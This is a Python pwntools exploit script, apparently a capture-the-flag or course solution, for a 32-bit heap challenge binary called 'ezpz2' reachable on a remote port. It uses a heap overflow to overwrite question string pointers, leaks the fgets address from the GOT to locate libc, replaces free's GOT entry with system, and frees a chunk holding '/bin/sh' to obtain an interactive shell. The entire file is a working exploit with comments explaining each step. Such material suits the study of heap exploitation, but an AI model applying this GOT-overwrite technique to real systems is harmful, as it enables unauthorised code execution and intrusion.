from pwn import *

PROG_NAME = "./ezpz2"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 7002
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_i386.so"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)

def create(num):
	p.recvuntil("refresh): ")
	p.sendline("C")

def free(num):
	p.recvuntil("refresh): ")
	p.sendline("D")
	p.sendline(str(num))

def set(num, data):
	p.recvuntil("refresh): ")
	p.sendline("S")
	p.sendline(str(num))
	p.sendline(data)
	print(num, data)

def ask(num):
	p.recvuntil("refresh): ")
	p.sendline("A")
	p.sendline(str(num))
	p.recvuntil("I have the answer perhaps: '")
	return p.recvuntil("'", drop=True)

# this function will abuse the heap overflow
def gen_addr_payload(addr):
	overflow = b'A'*0x1c #fills it's own allocated string space with 'A's
	overflow += p32(0x21) #preserve next question's, chunk 1 metadata
	overflow += b'A'*0x18 #fill the next question's chunk 1
	overflow += p32(addr) #overwrite next question's string pointer
	overflow += p32(0x21) #preserve next questions, chunk 2 metadata (due to \n overflow)
	return overflow


# the order of freeing has been swapped to avoid the previous exploit
# also the function pointer is removed
# but now there is a heap overflow of 0x60 bytes in set_question()

create(0)
create(1)
create(2)
create(3)
set(0, gen_addr_payload(elf.got['fgets']))
fgets_addr = u32(ask(1)[:4])
print(hex(fgets_addr))

'''
identifying libc
puts is at offset b40
fgets is at fb0

according to libc.nullbyte.cat, the libc version is libc6_2.27-3ubuntu1_i386
'''

# calculate libc base and /bin/sh address
libc_base = fgets_addr - libc.symbols['fgets']
libc.address = libc_base
binsh_addr = next(libc.search(b'/bin/sh'))

# overwrite q3's string pointer with /bin/sh pointer
set(2, gen_addr_payload(binsh_addr))
# overwrite q1's string pointer with the free's GOT address
set(0, gen_addr_payload(elf.got['free']))
# write to q1, overwriting the free GOT entry with the system libc address
# there's a trailing \n which breaks the following GOT entries after free,
# so we preserve them
set(1, p32(libc.symbols['system'])
	  +p32(libc.symbols['getchar'])
	  +p32(libc.symbols['fgets']))

# q3's string is now /bin/sh, so this will execute system("/bin/sh")
free(3)

p.interactive()